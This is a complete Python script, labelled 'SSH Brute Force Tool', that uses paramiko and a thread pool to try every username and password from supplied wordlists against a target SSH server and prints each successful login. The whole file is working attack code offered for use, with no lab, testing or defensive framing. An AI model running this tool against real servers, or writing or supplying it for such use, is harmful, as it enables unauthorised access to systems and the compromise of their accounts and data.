
import paramiko
import argparse
from concurrent.futures import ThreadPoolExecutor
import threading

# Lock to prevent mixed terminal output
lock = threading.Lock()

def attempt_login(host, port, username, password):
    """
    Attempt to login to SSH with the given username and password.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(hostname=host, port=port, username=username, password=password, timeout=5)
        with lock:
            print(f"[+] SUCCESS: {username}:{password}")
        ssh.close()
    except paramiko.AuthenticationException:
        with lock:
            print(f"[-] Failed: {username}:{password}")
    except Exception as e:
        with lock:
            print(f"[!] Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="SSH Brute Force Tool")
    parser.add_argument("--host", required=True, help="Target host IP or domain")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("--users", required=True, help="Path to usernames file")
    parser.add_argument("--passwords", required=True, help="Path to passwords file")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default: 5)")
    args = parser.parse_args()

    try:
        with open(args.users, "r") as f:
            usernames = f.read().splitlines()
        with open(args.passwords, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print("[-] Users or passwords file not found.")
        return

    print(f"\n[*] Starting brute-force on {args.host}:{args.port}")
    print(f"[*] Total attempts: {len(usernames) * len(passwords)}\n")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for user in usernames:
            for pwd in passwords:
                executor.submit(attempt_login, args.host, args.port, user, pwd)

if __name__ == "__main__":
    main()
